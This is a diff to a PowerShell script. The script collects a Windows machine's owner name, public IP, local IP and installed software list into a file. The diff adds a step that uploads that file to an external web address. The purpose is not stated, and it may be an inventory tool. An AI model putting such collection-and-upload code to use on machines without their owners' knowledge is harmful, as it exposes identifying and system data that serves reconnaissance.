@@ -1,5 +1,5 @@
 $user = Get-WMIObject -ClassName Win32_ComputerSystem
-$pc_name = [System.Net.Dns]::GetHostName()
+# $pc_name = [System.Net.Dns]::GetHostName()
 $public_ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
 
 #local ip
@@ -25,8 +25,12 @@ Add-Content $file_path -Value $user.PrimaryOwnerName
 Add-Content $file_path -Value $public_ip
 
 
-
 foreach ($l in $list) {
     $v = $l.Name + " " + $l.Version
     Add-Content $file_path -Value $v
 }
+
+
+$wc = New-Object System.Net.WebClient
+$resp = $wc.UploadFile("https://installed.mattkozlowski.pl/upload",$file_path)
+Write-Host $resp
